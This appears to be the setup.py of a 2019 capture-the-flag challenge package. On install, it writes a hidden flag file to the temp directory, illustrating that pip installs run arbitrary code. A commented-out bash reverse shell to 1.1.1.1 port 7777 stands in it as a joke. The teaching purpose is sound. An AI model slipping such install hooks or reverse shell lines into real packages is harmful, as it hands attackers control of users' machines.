from setuptools import setup, find_packages
import tempfile
from os import path, system

tmp_file = tempfile.gettempdir() + path.sep + '.f14g_is_here'
f = open(tmp_file, 'w')
f.write('TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9')
f.close()

# system('bash -i >& /dev/tcp/1.1.1.1/7777 0>&1')
# Ohhhh, that a joke. I won't do that. 

setup(
    name='nctf_2019_installme',
    version=0.2,
    description=(
        'Get flagggggggggg!'
    ),
    author='rmb122',
    author_email='abuse@anti-spam.cn',
    license='GPLv3.0',
    packages=find_packages(),
    platforms=["all"],
    keywords=['nctf', 'getflag'],
    url='http://www.google.com'
)
